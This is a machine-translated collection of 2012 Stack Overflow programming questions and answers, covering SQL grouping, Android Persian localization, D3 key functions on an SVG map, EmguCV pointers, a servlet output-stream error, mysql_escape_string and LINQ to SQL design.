> 时间：2012-06-30T06:00:14.993

@Timex

试试下面的查询。

```
Select au.ID from account_users au
inner join posts p on au.ID = p.author
Group By au.ID
having COUNT(p.post_id) > 5 
```

# android - 如何为 Android TextView 输入 RTL 字符串

> ID：11271810
> 
> 赞同：3
> 
> 时间：2012-06-30T05:47:53.800
> 
> 标签：android, localization, persian, farsi

我有一个为英语编写的 Android 应用程序，现在我想将其转换为波斯语/波斯语。我想知道如何为 TextView 文本键入波斯文文本。如何同时维护英文和波斯文 String.xml。请帮忙。

欢呼佐尔夫

```
Locale locale = new Locale("fa-IR"); 
    Locale.setDefault(locale); 
    Configuration config = new Configuration(); 
    config.locale = locale; 
    getBaseContext().getApplicationContext().getResources().updateConfiguration(config, null); 
```

我把这段代码放在哪里，现在我把这段代码放在 OnCreate 中，它不会将 TextView 的文本更改为波斯语

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T07:46:55.747

要显示正确形式的波斯字符，请使用[此解决方案](https://stackoverflow.com/a/7962813/779408)。

**更新**

以及更改 UI 中加载的当前资源：

```
tf = Farsi.GetFarsiFont(this);

tvTitle01 = (TextView) findViewById(R.id.tvTitle01);
tvTitle01.setTypeface(tf);
tvTitle01.setText(Farsi.Convert(tvTitle01.getText().toString())); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T05:51:01.567

Android 有内置的本地化机制。

[http://developer.android.com/guide/topics/resources/localization.html](http://developer.android.com/guide/topics/resources/localization.html)

您可以根据语言创建不同的值文件夹，并且可以为每种语言保留不同的 string.xml 文件。例子：

`res/values/strings.xml` 包含应用程序使用的所有字符串的英文文本，包括名为 title 的字符串的文本。

`res/values-fr/strings.xml` 包含所有字符串的法语文本，包括标题。

`res/values-ja/strings.xml` 包含除标题之外的所有字符串的日语文本。

如果您的 Java 代码引用 R.string.title，以下是运行时会发生的情况：

如果设备设置为法语以外的任何语言，Android 将从`res/values/strings.xml`文件中加载标题。

如果设备设置为法语，Android 将从`res/values-fr/strings.xml`文件中加载标题。

# javascript - 使用 D3 将数据添加到服务器端 SVG

> ID：11271812
> 
> 赞同：0
> 
> 时间：2012-06-30T05:48:26.653
> 
> 标签：javascript, svg, d3.js, geojson

我一直在试验 D3 和地图。到目前为止，我看到的所有示例和教程都是从 GeoJSON 构建 SVG 并添加数据。但是我已经在 html 中有一个 SVG 地图，并且想使用 D3 将数据添加到路径中（并且能够在数据集之间切换，但这是下一个障碍）。

我已将 ID 添加到路径中，但找不到使用键功能将路径的 ID 与我的数据中的 ID 匹配的方法。

这是我的问题：这种匹配是否可能以及如何匹配？还是我应该使用 GeoJSON 路由？

这是我的简化页面和代码：

```
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Bevolkingsprognose</title>
<script src="../d3/d3.v2.min.js"></script>
<style type="text/css">
g.provincies path {
fill: #FFFFFF;
}
</style>
</head>
<body>
<div class="kaart">
<svg version="1.1" xmlns="&ns_svg;" xmlns:xlink="&ns_xlink;" viewBox="0 0 288 288" xml:space="preserve" enable-background="new 0 0 288 288">
<g transform="scale(0.28,0.28) matrix(2.0833333 0 0 -2.0833333 300 300)">
        <g class="provincies" color-interpolation="linearRGB">
            <path id="limburg" d="M44.507297 -41.756513 L44.484249 -42.07919 L44.484249 -42.240529 L44.530346 -42.37882 L44.668636 -42.655401 L44.714733 -42.655401 L47.134816 -42.632352 L49.577947 -44.084402 L50.131109 -44.614515 L50.154157 -45.121581 L49.462705 -46.665824 L49.624044 -48.993713 L49.670141 -49.062858 L49.83148 -49.247245 L49.923673 -49.339439 L50.269399 -49.477729 L50.799513 -49.685165 L51.444868 -49.938698 L51.85974 -50.100037 L52.159368 -50.215278 L53.173499 -50.607101 L53.795806 -50.722344 L54.694693 -52.105248 L54.510306 -52.474023 L53.795806 -54.594476 L53.473128 -56.115671 L53.473128 -56.161768 L53.496176 -56.184816 L56.031501 -58.720141 L57.276115 -59.872562 L57.64489 -60.103046 L57.714035 -60.172191 L60.525941 -64.182614 L60.871667 -64.758824 L60.940812 -64.874066 L61.309587 -65.588567 L61.378732 -65.98039 L61.378732 -66.141729 L61.424828 -67.109762 L62.070184 -69.437651 L62.070184 -70.221297 L61.908845 -72.387847 L61.148248 -76.329125 L61.079103 -76.651803 L61.540071 -77.112771 L62.369814 -81.215387 L62.300668 -81.330629 L62.001039 -81.630259 L61.655313 -81.952936 L61.332635 -82.252566 L60.088021 -83.404986 L58.705116 -84.096438 L56.19284 -89.074895 L55.939308 -89.812444 L55.939308 -90.112073 L55.801017 -90.273412 L55.639678 -90.457799 L55.132613 -91.034009 L54.786887 -91.425832 L53.72666 -92.624349 L53.542273 -92.831785 L53.450079 -92.923979 L53.380934 -92.970075 L52.873869 -93.292753 L52.643385 -93.431044 L53.265692 -94.836996 L53.334838 -94.998335 L53.519225 -95.436255 L53.519225 -95.459304 L53.496176 -95.482352 L53.380934 -95.528449 L53.334838 -95.528449 L53.27337 -95.5054 L53.242644 -95.482352 L52.689482 -95.482352 L52.57424 -95.5054 L52.505095 -95.528449 L52.366804 -95.689788 L52.366804 -96.173804 L52.389853 -96.427337 L52.435949 -96.450385 L52.71253 -99.56192 L53.28874 -100.66824 L53.311789 -100.69129 L53.357886 -100.71434 L53.680564 -100.78349 L54.372016 -100.85263 L54.510306 -100.85263 L55.109565 -100.5069 L55.295119 -100.30852 L55.345653 -100.24775 L55.409194 -100.16118 L55.524436 -99.99984 L55.662726 -99.861549 L55.75492 -99.792404 L55.916259 -99.677162 L56.446373 -99.400581 L57.552696 -98.84742 L58.612923 -98.340354 L58.889504 -98.524742 L59.23523 -98.801323 L59.604005 -99.100952 L59.419617 -99.239242 L59.073891 -99.42363 L58.635971 -99.654114 L57.022583 -100.46081 L57.183922 -100.62215 L57.806229 -101.03702 L58.382439 -101.40579 L58.635971 -101.56713 L58.820358 -101.68237 L59.119988 -101.86676 L57.368309 -103.18052 L56.76905 -103.36491 L54.003241 -104.47123 L53.957144 -104.56342 L53.818854 -104.9322 L53.772757 -105.20878 L53.657515 -105.53146 L52.966063 -106.08462 L52.758627 -106.17681 L52.689482 -106.19986 L52.505095 -106.19986 L50.430738 -108.41251 L49.116979 -108.85043 L47.964559 -109.70322 L47.849316 -109.81846 L47.641881 -110.09504 L47.157864 -110.80954 L46.235928 -112.23854 L46.235928 -112.42293 L46.189831 -112.86085 L46.05154 -113.78279 L45.47533 -114.40509 L45.152652 -114.61253 L44.461201 -114.61253 L44.046329 -114.52034 L43.377925 -113.48316 L43.331828 -113.39097 L42.963054 -112.1694 L41.557101 -112.42293 L39.505793 -113.11438 L39.482744 -113.16048 L39.482744 -113.32182 L39.505793 -113.50621 L39.528841 -113.6445 L40.174196 -115.94934 L41.395762 -117.2631 L42.041117 -118.16199 L41.948924 -119.70623 L41.511004 -120.97389 L42.986102 -120.62817 L43.861942 -119.89062 L43.908039 -119.86757 L44.046329 -119.84452 L44.89912 -119.70623 L49.900625 -120.05195 L49.900625 -120.25939 L49.83148 -120.46683 L49.577947 -121.20438 L49.255269 -122.01107 L49.163076 -122.21851 L49.070882 -122.37984 L49.047833 -122.40289 L48.586865 -122.67947 L49.393559 -125.03041 L51.467917 -125.51443 L53.519225 -126.32112 L53.657515 -126.39027 L54.003241 -126.62075 L54.026289 -126.87428 L53.403983 -128.00366 L53.265692 -128.60291 L53.15045 -129.24827 L53.15045 -129.31741 L53.173499 -129.5479 L53.219595 -129.73229 L53.403983 -130.33155 L53.427031 -130.35459 L53.457757 -130.33155 L53.473128 -130.28545 L53.496176 -130.28545 L53.542273 -130.3085 L53.864951 -130.60813 L53.887999 -130.63117 L53.911048 -130.67727 L53.980193 -131.34567 L53.980193 -131.41482 L53.911048 -131.6453 L53.127402 -134.01929 L53.104353 -134.04234 L52.113272 -133.58137 L51.514013 -133.30479 L50.453786 -133.67356 L49.577947 -134.08844 L49.53185 -134.11148 L49.508802 -134.13453 L49.462705 -134.31892 L49.462705 -134.36502 L49.854528 -136.94644 L49.900625 -137.19997 L49.923673 -137.40741 L48.978688 -138.44458 L48.95564 -138.46763 L48.840398 -138.55983 L48.609914 -138.67507 L48.540769 -138.67507 L47.227009 -137.89142 L46.812138 -138.51373 L47.664929 -139.52786 L50.061963 -141.34868 L50.154157 -141.48697 L50.154157 -141.55612 L49.670141 -143.49219 L47.826268 -143.69962 L47.687977 -143.69962 L47.3653 -143.65352 L46.78909 -143.53828 L46.696896 -143.46914 L46.696896 -143.39999 L46.719944 -143.33085 L46.742993 -143.33085 L46.742993 -143.14646 L46.581654 -142.98512 L46.48946 -142.93902 L45.798008 -142.73159 L45.77496 -142.73159 L45.636669 -142.75464 L44.876072 -143.00817 L44.369007 -143.2156 L44.184619 -143.3078 L43.285731 -143.86096 L42.916957 -143.99925 L42.847812 -143.99925 L41.902827 -143.86096 L41.188326 -143.39999 L41.165278 -143.33085 L39.482744 -142.66244 L38.284227 -142.5011 L37.477533 -143.00817 L37.131807 -143.14646 L36.325112 -143.42304 L36.186822 -143.46914 L35.887193 -143.46914 L34.342949 -142.27062 L34.319901 -142.22452 L34.112465 -141.7866 L34.04332 -141.57917 L33.997223 -141.32564 L33.858933 -140.70333 L33.74369 -140.68028 L33.582352 -140.68028 L33.213577 -140.72638 L33.121384 -140.74943 L33.02919 -140.84162 L32.337738 -141.57917 L32.130302 -141.80965 L31.507995 -142.68549 L28.557799 -143.63048 L28.511702 -143.63048 L28.39646 -143.60743 L28.096831 -143.53828 L27.681959 -143.3539 L27.681959 -143.10036 L27.705008 -143.00817 L27.797201 -142.82378 L27.912443 -142.66244 L28.027685 -142.5472 L28.119879 -142.43196 L28.281218 -142.22452 L28.350363 -142.13233 L28.465605 -141.97099 L28.53475 -141.85575 L28.626944 -141.67136 L28.696089 -141.48697 L28.926573 -140.84162 L28.926573 -140.68028 L28.719137 -138.67507 L28.603896 -138.09886 L27.612814 -137.73008 L25.838087 -136.94644 L25.054441 -134.82598 L24.847005 -134.18063 L24.847005 -134.11148 L25.077489 -132.452 L25.192731 -131.6453 L25.400167 -131.43787 L25.630651 -131.29958 L26.783072 -130.65422 L27.474523 -130.33155 L28.304266 -129.34046 L28.350363 -129.27132 L28.442557 -129.08693 L28.488654 -128.97169 L28.511702 -128.8795 L28.580847 -128.57987 L28.580847 -128.32633 L28.557799 -128.0728 L28.557799 -127.91146 L28.626944 -127.77317 L28.742186 -127.65793 L28.880476 -127.58878 L29.087912 -127.51964 L29.295348 -127.51964 L29.364493 -127.54269 L29.456686 -127.58878 L29.779364 -127.86537 L31.738479 -124.26981 L32.406883 -123.60141 L32.499077 -123.50922 L32.568222 -123.41702 L32.568222 -123.14044 L32.545173 -123.0713 L32.499077 -122.9791 L32.406883 -122.84081 L32.337738 -122.74862 L32.268592 -122.67947 L32.130302 -122.56423 L31.899818 -122.44899 L31.807624 -122.42594 L31.646285 -122.42594 L31.554092 -122.47204 L31.484946 -122.51813 L31.43885 -122.56423 L31.369705 -122.65643 L31.346656 -122.70252 L31.300559 -122.77167 L31.185317 -122.88691 L31.070075 -122.9791 L31.00093 -123.00215 L30.816543 -123.04825 L30.56301 -123.04825 L30.28643 -122.90996 L30.240332 -122.86386 L30.194236 -122.79472 L30.102042 -122.63338 L30.102042 -122.33375 L30.148139 -122.21851 L30.171187 -122.17241 L31.116172 -120.72036 L31.254462 -120.58207 L31.300559 -120.55902 L31.392753 -120.53597 L31.556714 -120.47685 L31.656844 -120.42266 L31.734359 -120.37463 L31.968963 -120.21329 L32.960045 -118.78429 L33.006141 -118.71515 L33.098335 -118.53076 L33.490158 -116.52555 L33.121384 -115.48837 L32.890899 -114.3129 L33.374916 -113.11438 L34.481239 -112.37683 L35.080498 -112.30769 L35.472321 -110.25638 L36.555597 -108.94262 L37.293146 -108.20507 L35.979386 -107.35228 L35.794999 -107.16789 L35.748902 -107.09875 L35.725854 -107.05265 L35.702805 -106.98351 L35.679757 -106.86827 L35.679757 -106.72998 L35.818048 -106.33815 L35.864144 -106.24596 L35.910241 -106.17681 L36.64779 -105.27793 L36.670838 -105.25488 L38.261179 -103.89502 L38.722147 -103.57234 L36.855225 -101.3136 L36.763032 -101.2675 L36.693887 -101.2675 L35.426225 -101.77457 L34.319901 -102.53516 L33.720642 -100.76044 L33.6054 -100.11508 L33.098335 -99.700211 L33.006141 -99.631065 L31.623237 -99.008758 L31.531043 -99.100952 L31.254462 -99.308388 L29.295348 -99.953743 L29.249251 -99.953743 L26.322103 -99.400581 L25.676748 -98.501693 L25.630651 -98.225113 L25.515409 -98.155967 L25.35407 -98.063774 L24.939199 -97.856338 L24.570424 -97.694999 L23.948117 -97.441466 L20.052936 -95.851127 L21.919857 -95.482352 L22.887891 -95.159674 L23.348859 -94.998335 L23.394955 -94.975287 L23.418004 -94.952239 L23.694585 -93.200559 L23.717633 -93.039221 L23.740681 -92.785688 L23.740681 -92.209478 L23.76373 -91.656316 L23.786778 -91.080106 L23.809827 -90.619138 L23.855923 -90.480848 L23.971165 -90.273412 L24.20165 -89.904637 L24.386037 -89.628056 L25.031392 -88.683072 L26.80612 -86.170795 L33.121384 -84.211681 L37.592775 -82.851824 L39.528841 -82.252566 L41.165278 -80.984903 L43.400974 -78.933595 L41.580149 -75.660721 L39.759325 -72.595283 L39.736277 -72.595283 L39.667132 -72.480041 L39.574938 -72.318702 L39.551889 -72.272605 L39.25226 -70.543974 L39.021776 -69.184118 L38.906534 -68.492666 L38.284227 -66.717939 L37.339242 -60.33353 L39.436647 -60.702304 L40.151148 -60.817546 L40.404681 -60.863643 L40.635165 -60.90974 L40.727358 -60.955837 L40.865649 -61.04803 L41.211375 -61.34766 L41.349665 -61.48595 L41.534053 -61.647289 L41.672343 -61.762531 L41.995021 -61.762531 L43.424022 -61.62424 L43.585361 -61.601192 L43.954135 -61.48595 L44.461201 -61.324611 L45.682766 -60.932788 L46.166782 -60.771449 L46.258976 -60.725352 L47.388348 -60.149142 L47.549687 -60.056949 L47.734074 -59.964755 L47.895413 -59.89561 L47.987607 -59.89561 L48.702108 -60.448772 L48.909543 -60.656207 L49.716237 -61.647289 L50.730368 -61.04803 L50.638174 -60.978885 L50.522931 -60.840595 L50.384641 -60.656207 L50.292448 -60.517917 L50.246351 -60.425723 L50.200254 -60.310481 L50.10806 -60.0339 L50.085012 -59.941707 L49.485753 -57.521624 L49.186124 -55.332025 L49.163076 -55.101541 L49.070882 -54.848008 L49.001737 -54.709718 L48.932591 -54.594476 L48.886495 -54.525331 L48.471623 -54.110459 L47.3653 -53.027184 L46.512509 -52.497071 L46.143734 -52.289635 L46.097637 -52.289635 L46.005444 -52.243538 L45.867153 -52.151345 L45.77496 -52.082199 L45.682766 -51.990006 L45.567524 -51.851715 L45.47533 -51.713425 L45.406185 -51.575135 L45.360088 -51.459893 L45.33704 -51.390748 L45.313991 -51.298554 L45.290943 -51.183312 L45.267895 -51.021973 L45.244846 -50.791489 L45.244846 -50.422714 L45.267895 -50.338213 L45.290943 -50.169182 L45.313991 -49.892601 L45.313991 -48.832374 L44.76083 -45.743887 L44.691684 -45.605597 L44.645588 -45.536452 L44.507297 -45.398161 L44.369007 -45.305968 L44.000232 -45.121581 L43.44707 -44.914145 L43.331828 -44.914145 L42.409892 -44.798903 L42.064166 -44.775854 L41.879779 -44.752806 L41.534053 -44.68366 L41.441859 -44.660612 L41.234423 -44.591467 L41.119181 -44.54537 L40.888697 -44.430128 L40.727358 -44.337934 L40.635165 -44.268789 L40.335535 -43.96916 L40.243342 -43.784773 L40.220293 -43.692579 L40.197245 -43.554288 L40.174196 -43.39295 L40.151148 -43.185514 L40.012857 -42.447965 L39.851519 -41.687368 L39.82847 -41.595174 L39.69018 -41.318593 L39.413599 -41.042012 L39.229212 -40.903722 L39.160066 -40.857625 L38.929583 -40.719334 L40.70431 -38.621929 L41.14223 -39.267285 L41.995021 -40.92677 L42.018069 -40.995915 L42.087214 -41.180302 L42.110263 -41.2264 L43.239635 -42.286626 L43.470119 -42.332723 L43.562313 -42.332723 L44.507297 -41.756513 Z "  stroke="#000000" fill="none" stroke-opacity="1" stroke-width="0.12" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" />
            <path id="flevoland" d="M30.977061 43.924734 L33.189708 43.602057 L34.572612 43.602057 L34.710902 43.579008 L34.919159 43.46293 L35.010114 43.408853 L35.528819 42.907838 L37.545857 40.721005 L37.63805 40.536618 L37.661099 40.467473 L37.684147 40.352231 L37.684147 40.236989 L37.730244 40.07565 L37.753293 40.052602 L37.776341 40.052602 L37.85042 40.215576 L37.916492 39.852181 L37.845486 39.914311 L37.799389 39.93736 L37.776341 39.93736 L37.776341 39.476392 L37.784019 39.461035 L37.868534 37.770809 L37.707195 36.59534 L37.476711 34.981952 L37.407566 34.843661 L36.92355 33.944774 L34.572612 29.726915 L34.180789 29.150705 L32.406062 27.652558 L31.875948 27.214638 L31.161448 26.684525 L30.723528 26.592332 L28.902704 26.523186 L25.652878 24.886749 L25.445443 24.748459 L25.261055 24.610168 L24.777039 24.241394 L23.670715 23.319457 L23.417183 23.065925 L22.633537 21.867408 L22.564391 21.659972 L22.564391 21.627099 L19.614195 21.752165 L19.199324 21.337294 L18.023855 20.046583 L17.977758 19.95439 L17.931661 19.816099 L17.931661 19.539518 L17.95471 19.447325 L18.116049 18.94026 L18.231291 18.594534 L18.323484 18.50234 L18.646162 17.741743 L18.784453 16.819807 L18.254339 14.837643 L17.447645 12.348415 L17.401548 12.256222 L17.263258 12.117931 L11.385914 10.320155 L8.3896204 11.12685 L7.8364586 11.680011 L7.1911034 12.302318 L6.5687966 12.901577 L5.9695376 13.477787 L5.4163758 14.0079 L4.8401656 14.561062 L4.5405367 14.837643 L4.3561494 14.998982 L3.7568904 15.482998 L3.6416486 15.575192 L3.5494547 15.644337 L3.0654386 15.990063 L2.7888573 16.174451 L2.535325 16.33579 L1.5211948 16.912 L1.1985171 17.073339 L0.80669417 17.257726 L0.5992585 17.34992 L0.32267783 17.465162 L-0.41487123 17.741743 L-1.9130176 18.271856 L-3.1576318 18.548437 L-3.2728741 18.571485 L-3.4572613 18.594534 L-3.7107936 18.594534 L-3.9182293 18.571485 L-4.1026165 18.525389 L-6.9187432 17.724716 L-7.2141516 18.663679 L-8.1360879 22.628005 L-8.1360879 22.835441 L-8.1130395 22.927635 L-8.0208457 23.112022 L-7.9286523 23.204215 L-5.4163756 25.209427 L-4.7249238 25.624298 L-2.7427607 26.799767 L-2.7197123 26.799767 L-1.1985173 27.652558 L1.0602269 29.173753 L2.2126473 29.980447 L2.8349541 30.418367 L4.2409072 31.409449 L4.863214 31.847368 L5.8773442 32.561869 L6.499651 32.999789 L8.9197338 34.359645 L8.9888793 34.382693 L9.0349761 34.405742 L9.1041211 34.451838 L11.478107 36.480098 L11.570301 36.618389 L11.639446 36.733631 L11.754688 36.964115 L11.800785 37.079357 L11.800785 37.125454 L11.524204 37.701664 L11.408962 37.932148 L10.87313 38.162632 L11.132381 38.162632 L15.35024 40.882344 L15.48853 40.974538 L17.51679 43.002798 L18.853598 44.431799 L20.720519 45.376784 L22.080375 45.745559 L22.58744 45.883849 L23.255844 46.068236 L23.417183 46.114333 L23.555473 46.16043 L23.878151 46.321769 L24.385216 46.713592 L24.316071 46.413962 L24.892281 45.630316 L25.099716 45.422881 L25.168861 45.376784 L25.353249 45.28459 L25.422394 45.261542 L25.514588 45.238494 L30.977061 43.924734 Z M33.513206 66.594054 L33.536255 66.571005 L33.559303 66.571005 L33.74369 66.732344 L33.858933 66.847586 L34.135514 66.294424 L34.296852 65.994795 L34.435143 65.787359 L34.504288 65.695166 L34.642578 65.556875 L35.310982 64.957617 L35.910241 64.727133 L36.463403 64.727133 L37.293146 64.61189 L37.938501 64.33531 L38.09984 64.220067 L39.160066 63.45947 L40.796504 62.237904 L41.326617 61.707791 L41.85673 61.154629 L44.484249 55.830447 L44.530346 55.623011 L44.530346 55.323382 L44.461201 55.185092 L44.369007 55.023753 L44.922168 52.419283 L46.571592 51.433913 L46.350348 51.507661 L45.958526 51.576806 L45.704993 51.576806 L45.589751 51.300225 L44.713912 49.894272 L44.59867 49.77903 L44.529524 49.732933 L44.345137 49.64074 L36.439533 46.990172 L36.181521 46.970293 L25.675926 46.967124 L24.869232 47.128463 L24.800087 47.681625 L21.919036 51.784241 L21.895988 51.80729 L21.665503 51.853387 L21.365874 51.853387 L21.358196 51.922532 L21.342826 52.083871 L21.358196 53.97384 L21.381245 56.263325 L21.411971 59.897281 L21.435019 62.294315 L21.458068 62.455654 L21.481116 62.547848 L21.504165 62.616993 L21.57331 62.755284 L21.642455 62.870525 L25.399346 68.955305 L25.514588 69.116644 L25.606781 69.208838 L25.698975 69.277983 L25.75631 69.306651 L26.427623 69.46702 L27.312363 69.577612 L27.496751 69.577612 L28.2343 69.669806 L28.580026 69.715903 L28.626123 69.738951 L28.67222 69.785048 L28.695268 69.831145 L28.712575 70.01287 L29.548881 70.212654 L29.479735 70.512283 L29.479735 70.673622 L29.548881 70.673622 L29.641074 70.650573 L29.779364 70.604477 L31.13922 70.051315 L32.268592 68.921943 L33.213577 67.953909 L33.236626 67.746474 L33.421013 66.847586 L33.444061 66.778441 L33.513206 66.594054 Z M42.571231 47.256439 L42.29465 47.210343 L41.810633 47.141197 L41.626246 47.118149 L41.487955 47.118149 L41.464907 47.141197 L41.283773 47.246859 L41.371892 47.243705 L42.664753 47.307288 L42.617328 47.279488 L42.571231 47.256439 Z M25.69309 22.109306 L25.077489 21.649658 L24.85773 21.690543 L24.938377 21.752165 L25.69309 22.109306 Z "  stroke="#000000" fill="none" stroke-opacity="1" stroke-width="0.12" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" />
        </g>
    </g>
</svg>
</div>
<script type="text/javascript">

//The data (province, datatype, year and value)
var data = [
{"provincie":"flevoland",
 "type":"bevolking",
 "jaar":2008,
 "value":25},
{"provincie":"limburg",
 "type":"bevolking",
 "jaar":2008,
 "value":25} 
];

  //Set the default selection
  var selectedYear = 2008;
  var selectedType = "bevolking";

  //Make the data hierarchical
  var nestedData = d3.nest()
.key(function(d) {return d.type; })
.key(function(d) {return d.jaar; })
.entries(data);

 //Get the correct data
 var mapdata = nestedData[selectedType][selectedYear];

 //Get the SVG
 var svg = d3.select("svg");

 //Data koppelen aan provincie en mouseover/mouseout toevoegen
 svg.selectAll("g.provincies path")
   .data(mapdata)
   .style("fill", function(d) { return d.value; });

 </script>
 </body>
 </html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T16:53:51.533

是的，您可以通过向[selection.data提供](https://github.com/mbostock/d3/wiki/Selections#wiki-data)[键函数](http://bost.ocks.org/mike/constancy/#key-functions)将数据绑定到特定的现有元素。具体来说，请注意 API 参考中的这条评论：

> 当 key 函数在新数据元素上求值时，`this`上下文是数据数组；当在现有选择上评估 key 函数时，`this`上下文是关联的 DOM 元素。

因此，您需要定义一个键函数，该函数可以从数据 ( `d`) 或元素 ( `this`) 返回适当的标识符。这是一个例子：

```
function key(d) {
  return d ? d.provincie : this.id;
} 
```

或者，将它与您的数据连接结合起来：

```
svg.selectAll(".provincies path")
    .data(mapdata, function(d) { return d ? d.provincie : this.id; })
    … 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T11:54:14.957

这当然是可能的，原则上没有理由不这样做。如果您将代码发布在某处，我们可能会帮助您进行匹配。

# c# - 处理包装的 IntPtr 对象

> ID：11271815
> 
> 赞同：0
> 
> 时间：2012-06-30T05:49:02.333
> 
> 标签：c#, c++, pointers, opencv, emgucv

我正在将一些 OpenCV 代码从 C++ 转换为由 EmguCV 包装的 C#。一直困扰着我的一件事是，在 Opencv 中，很多东西都是指针`IplImage*`，`CvCapture*`等等，当我将它们翻译成 C# 时，它们都变得`IntPtrs`像`IntPtr Capture=CvInvoke.CvCreateCameraCapture(0)`在这个特定的问题中，我在访问表格中的矩阵数据时遇到问题的`IntPtr`

原始代码如下所示：

```
CvMat* ObjectPoints = CvCreateMat(/*some parameters*/);//initialize the matrix header
float* TempPoints = new float[/*size of the array of the TempPoints*/];
//assign some values to TempPoints
*ObjectPoints = cvMat(rows, cols, type, TempPoints)//assign the changed TempPoints as the data of the ObjectPoint matrix. other irrelevant parameters are omitted. 
```

当我用 C# 重写上面的部分时，它看起来像

```
IntPtr ObjectPoints = CvInvoke.CvCreateMat(/*some parameters*/);
float* TempPoints = new float[/*size of the array of the tempPoints*/];
//assign some value to TempPoints
//Then what? ObjectPoints is a pointer and EmguCV does not have a CvMat() method. So how can I achieve the effect as in the original code? 
```

如果我可以在这个问题之外扩展一点，在其他情况下，比如我有`IntPtr Frame = CvInoke.CvQueryImage(Capture);`另一个函数需要一个`Image<RGB, Byte>`，我怎样才能将一个 IntPtr 转换为一个图像？我知道相反的很简单，只需使用 MyImage.Ptr。但是如何将 IntPtr 转换为 Image 呢？

# java - 收到错误“已为此响应调用 getOutputStream()”

> ID：11271816
> 
> 赞同：1
> 
> 时间：2012-06-30T05:49:40.773
> 
> 标签：java, jsp, servlets, spring-mvc, download

我正在显示有关某些事件的报告。我希望控制器显示弹出窗口以进行保存和打开。

我已经在响应中设置了文件，在设置响应后我正在返回视图。

现在我的问题是，

我收到错误“java.lang.IllegalStateException：getOutputStream() 已被调用以获取此响应”

在我的**控制器类**中，我编写了以下代码：

......一些代码......

```
InputStream is =
        new FileInputStream(new File("c:/reports/test_jasper.pdf"));
            response.setHeader("Content-Disposition","attachment;filename=\"test_jasper.pdf\"");
            OutputStream opStream = response.getOutputStream();
            IOUtils.copy(is, opStream);
            response.flushBuffer();
            HttpServletResponse response1 = new HttpServletResponse();

        model.addAttribute(ABC, new abc());

        model.addAttribute(DEF, new def());
        return SOME_VIEW; 
```

**构架 ：**

Spring-MVC,休眠

**例外 ：**

java.lang.IllegalStateException: getOutputStream() 已经为此响应调用

**所需的 O/P ：** 我希望响应显示文件的弹出窗口，并希望浏览器重定向到其他视图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T11:44:34.483

在请求处理期间，`HttpServletResponse.getWriter()` 和 `HttpServletResponse.getOutputStream()` 都被调用。根据规范，同时使用 OutputStream 和 Writer 是非法的。

`HttpServletResponse.getWriter()`您在尝试在其他地方调用时抛出异常/

# php - mysql_escape_string() 有什么作用？

> ID：11271817
> 
> 赞同：2
> 
> 时间：2012-06-30T05:49:51.237
> 
> 标签：php, jquery, mysql

做什么`mysql_escape_string()`？我正在更新一个数据库。当我使用`$_POST('variable')` 它时，它没有得到更新，但与它一起使用`mysql_escape_string($_POST())`它工作正常。我通过 ajax 调用它。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-30T14:05:39.400

[`mysql_escape_string`](http://php.net/manual/en/function.mysql-escape-string.php)是 PHP mysql 扩展功能之一。它转义作为函数参数提供的字符串。*转义*意味着在*特殊字符前添加**反斜杠 (`\`* ) 。

*   `mysql_escape_string`旨在与[`mysql_query`](http://www.php.net/manual/en/function.mysql-query.php)函数一起使用，以安全地将 MySQL 查询参数传递给查询。*安全*意味着*不可能影响和更改所需的查询行为*。通过搜索“sql injection”了解更多信息，例如MDN 上的[Secure Development Guidelines](https://developer.mozilla.org/En/Secure_Development_Guidelines#SQL_Injection)。
*   *转义的*特殊字符*`mysql_escape_string`有：空字节 ( `0`)、换行符 ( `\n`)、回车 ( `\r`)、反斜杠 ( `\`)、单引号 ( `'`)、双引号 ( `"`) 和替换 ( `SUB`, or `\032`)。`%`并且`_`没有被这个函数转义。*
**   `mysql_escape_string`自 PHP 5.3.0 起已弃用。它应该被替换为[`mysql_real_escape_string`](http://www.php.net/manual/en/function.mysql-real-escape-string.php)函数，它除了对字符串进行转义外，还考虑到连接的当前字符集。*   两者都使用，`mysql_escape_string`并且不推荐使用[MySQLi](http://www.php.net/manual/en/intro.mysqli.php)或[PDO_MySQL](http://www.php.net/manual/en/ref.pdo-mysql.php)扩展`mysql_real_escape_string`的推荐替代方案。*

 *`$_POST('variable')`在您的情况下，最可能不起作用的原因是它包含一个或多个特殊字符，因此您正在执行的 MySQL 查询被无意更改和损坏。您使用 AJAX 调用它，如果您没有处理 AJAX 错误，您可能看不到错误消息。*

# c# - 我应该直接在代码后面使用 Linq To SQL 还是使用其他方法？

> ID：11271820
> 
> 赞同：6
> 
> 时间：2012-06-30T05:50:44.420
> 
> 标签：c#, asp.net, linq-to-sql

我们正在开发一个项目，`ASP.NET/C#`该项目不是一个非常大的项目，而是一个相当大的项目。目前我们已经开发了几个页面。我现在是从单个页面的角度来讨论的。到目前为止开发的每个页面都遵循该方法。

在我的页面后面的代码中，我们`Linq To SQL`直接使用查询。`insert operation`完成、`queries`填充`dropdownlists`等相关操作在其`database`背后的代码中使用。

虽然我们使用函数。其他页面也是如此。

我的问题是我应该将它们包含在`class`文件中，然后创建`objects`并调用适当的方法来完成我的工作吗？

如果是，我们应该`class`创建一个类还是每页创建一个类。这叫创作吗`Data Access Layer`？

谁能帮我建议一个正确的方法来做到这一点？

这种方法是一种很好的编程习惯吗？

这是我们在后面的代码中使用的一个简单函数

```
public void AccountTypeFill()
        {
            //Get the types of Account ie Entity and individual
            var acc = from type in dt.mem_types
                       select type.CustCategory;
            if (acc != null)
            {
                NewCustomerddlAccountType.DataSource = acc.Distinct().ToList();
                NewCustomerddlAccountType.DataBind();  
            }
        } 
```

谁能指出一个引用此查询的简单示例？

我希望我的问题是有道理的。欢迎任何建议。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-30T06:37:09.407

不要在代码隐藏中硬编码。使用类，这不是每个页面一个类的问题。

这些链接将有助于：

